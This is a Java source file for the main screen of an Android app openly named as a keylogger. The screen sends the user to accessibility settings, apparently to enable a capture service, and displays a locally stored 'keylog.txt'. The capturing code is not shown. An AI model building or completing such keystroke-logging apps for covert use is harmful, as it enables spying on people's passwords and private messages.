package com.example.keylogger;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import java.io.FileInputStream;
import java.io.IOException;

public class MainActivity extends AppCompatActivity {

    private TextView logTextView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        logTextView = findViewById(R.id.tv_logs);

        Button enableButton = findViewById(R.id.btn_enable_service);
        enableButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivity(intent);
            }
        });

        Button refreshButton = findViewById(R.id.btn_refresh_logs);
        refreshButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                updateLogs();
            }
        });
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateLogs();
    }

    private void updateLogs() {
        StringBuilder sb = new StringBuilder();
        try (FileInputStream fis = openFileInput("keylog.txt")) {
            int c;
            while ((c = fis.read()) != -1) {
                sb.append((char) c);
            }
            logTextView.setText(sb.toString());
        } catch (IOException e) {
            logTextView.setText("No logs found or error reading file.");
        }
    }
}
